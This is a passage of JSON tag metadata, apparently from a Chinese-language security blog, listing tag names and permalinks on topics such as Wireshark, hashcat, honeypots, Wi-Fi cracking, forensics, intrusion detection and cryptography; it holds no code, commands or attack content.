7%84%E5%88%99/"},{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"},{"name":"hashcat","slug":"hashcat","permalink":"https://gryffinbit.top/tags/hashcat/"},{"name":"PyQt","slug":"PyQt","permalink":"https://gryffinbit.top/tags/PyQt/"},{"name":"conda","slug":"conda","permalink":"https://gryffinbit.top/tags/conda/"},{"name":"mysql","slug":"mysql","permalink":"https://gryffinbit.top/tags/mysql/"},{"name":"云服务器","slug":"云服务器","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"应急响应","slug":"应急响应","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"入侵排查","slug":"入侵排查","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://gryffinbit.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"蜜罐","slug":"蜜罐","permalink":"https://gryffinbit.top/tags/%E8%9C%9C%E7%BD%90/"},{"name":"Hfish","slug":"Hfish","permalink":"https://gryffinbit.top/tags/Hfish/"},{"name":"MacOS","slug":"MacOS","permalink":"https://gryffinbit.top/tags/MacOS/"},{"name":"M1芯片","slug":"M1芯片","permalink":"https://gryffinbit.top/tags/M1%E8%8A%AF%E7%89%87/"},{"name":"靶场","slug":"靶场","permalink":"https://gryffinbit.top/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"linux","slug":"linux","permalink":"https://gryffinbit.top/tags/linux/"},{"name":"macos","slug":"macos","permalink":"https://gryffinbit.top/tags/macos/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"Linux/MacOs","slug":"Linux-MacOs","permalink":"https://gryffinbit.top/tags/Linux-MacOs/"},{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"},{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"},{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"},{"name":"C","slug":"C","permalink":"https://gryffinbit.top/tags/C/"},{"name":"WPS","slug":"WPS","permalink":"https://gryffinbit.top/tags/WPS/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"},{"name":"wifi破解","slug":"wifi破解","permalink":"https://gryffinbit.top/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"汇编","slug":"汇编","permalink":"https://gryffinbit.top/tags/%E6%B1%87%E7%BC%96/"},{"name":"取证","slug":"取证","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"SSL","slug":"SSL","permalink":"https://gryffinbit.top/tags/SSL/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"WinInet","slug":"WinInet","permalink":"https://gryffinbit.top/tags/WinInet/"},{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"CA","slug":"CA","permalink":"https://gryffinbit.top/tags/CA/"},{"name":"证书","slug":"证书","permalink":"https://gryffinbit.top/tags/%E8%AF%81%E4%B9%A6/"},{"name":"PGP","slug":"PGP","permalink":"https://gryffinbit.top/tags/PGP/"},{"name":"公钥体制","slug":"公钥体制","permalink":"https://gryffinbit.top/tags/%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6/"},{"name":"volatility","slug":"volatility","permalink":"https://gryffinbit.top/tags/volatility/"},{"name":"GNS3","slug":"GNS3","permalink":"https://gryffinbit.top/tags/GNS3/"},{"name":"IDS","slug":"IDS","permalink":"https://gryffinbit.top/tags/IDS/"},{"name":"CAsyncSocket","slug":"CAsyncSocket","permalink":"https://gryffinbit.top/tags/CAsyncSocket/"},{"name":"CSocket","slug":"CSocket","permalink":"https://gryffinbit.top/tags/CSocket/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://gryffinbit.top/tags/gmpy2/"},{"name":"图片","slug":"图片","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"},{"name":"Python","slug":"Python","permalink":"https://gryffinbit.top/tags/Python/"},{"name":"SHA-1","slug":"SHA-1","permalink":"https://gryffinbit.top/tags/SHA-1/"},{"name":"散列函数","slug":"散列函数","permalink":"https://gryffinbit.top/tags/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0/"},{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"},{"name":"AES","slug":"AES","permalink":"https://gryffinbit.top/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://gryffinbit.top/tags/DES/"},{"name":"古典密码","slug":"古典密码","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"杂","slug":"杂","permalink":"https://gryffinbit.top/tags/%E6%9D%82/"},{"name":"第一届信安大挑战","slug":"第一届信安大挑战","permalink":"https://gryffinbit.top/tags/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98/"},{"name":"流密码","slug":"流密码","permalink":"https://gryffinbit.top/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}]}